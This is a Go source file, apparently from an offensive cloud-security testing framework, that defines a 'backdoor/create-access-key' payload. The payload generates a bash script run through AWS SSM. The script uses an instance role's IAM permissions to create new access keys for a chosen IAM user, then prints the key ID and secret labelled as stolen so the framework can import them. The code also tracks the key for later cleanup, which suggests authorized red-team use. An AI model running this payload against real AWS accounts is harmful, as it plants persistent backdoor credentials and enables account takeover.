// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package ssm

import (
	"fmt"

	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
)

// BackdoorCreateAccessKeyPayload creates access keys for an IAM user using the
// instance role's IAM permissions and emits PATHFINDER_IDENTITY_DATA for auto-import.
type BackdoorCreateAccessKeyPayload struct{}

func init() {
	payloads.Register(&BackdoorCreateAccessKeyPayload{})
}

func (p *BackdoorCreateAccessKeyPayload) GetName() string {
	return "backdoor/create-access-key"
}

func (p *BackdoorCreateAccessKeyPayload) GetDescription() string {
	return "Create access keys for an IAM user using the instance role's IAM permissions"
}

func (p *BackdoorCreateAccessKeyPayload) GetTags() []string {
	return []string{
		payloads.TagServiceSSM,
		payloads.TagLanguageBash,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorCreateAccessKeyPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_ARN",
			Description: "IAM user name or ARN to create access keys for",
			Required:    true,
		},
	}
}

func (p *BackdoorCreateAccessKeyPayload) Validate(options map[string]string) error {
	if options["TARGET_ARN"] == "" {
		return fmt.Errorf("TARGET_ARN is required for backdoor/create-access-key payload")
	}
	return nil
}

func (p *BackdoorCreateAccessKeyPayload) GenerateCode(options map[string]string) (string, error) {
	targetARN := options["TARGET_ARN"]
	userName, _ := parsePrincipalARN(targetARN)

	script := fmt.Sprintf(`echo "Pathrunner: create-access-key"
echo "Target user: %s"

TARGET_USER="%s"

KEY_OUTPUT=$(aws iam create-access-key --user-name "$TARGET_USER" 2>&1)
if [ $? -ne 0 ]; then
    echo "FAILED: Could not create access key: $KEY_OUTPUT"
    exit 1
fi

AK_ID=$(echo "$KEY_OUTPUT" | grep -o '"AccessKeyId": "[^"]*"' | cut -d'"' -f4)
AK_SECRET=$(echo "$KEY_OUTPUT" | grep -o '"SecretAccessKey": "[^"]*"' | cut -d'"' -f4)

echo "Access key created successfully for $TARGET_USER"

echo "--- PATHFINDER_IDENTITY_DATA ---"
echo "NAME=stolen/$TARGET_USER"
echo "TYPE=keys"
echo "ACCESS_KEY_ID=$AK_ID"
echo "SECRET_ACCESS_KEY=$AK_SECRET"
echo "AUTO_SWITCH=false"
echo "--- END_PATHFINDER_IDENTITY_DATA ---"
`, userName, userName)

	return script, nil
}

func (p *BackdoorCreateAccessKeyPayload) ProcessResult(result string) (string, error) {
	return result, nil
}

// ReportSideEffects returns the created access key as a tracked resource.
func (p *BackdoorCreateAccessKeyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	userName, _ := parsePrincipalARN(options["TARGET_ARN"])

	return []modules.CreatedResource{
		{
			Type:          "iam:access-key",
			Name:          fmt.Sprintf("access-key/%s", userName),
			CleanupMethod: "iam:DeleteAccessKey",
			Metadata: map[string]string{
				"target_user": userName,
			},
		},
	}
}
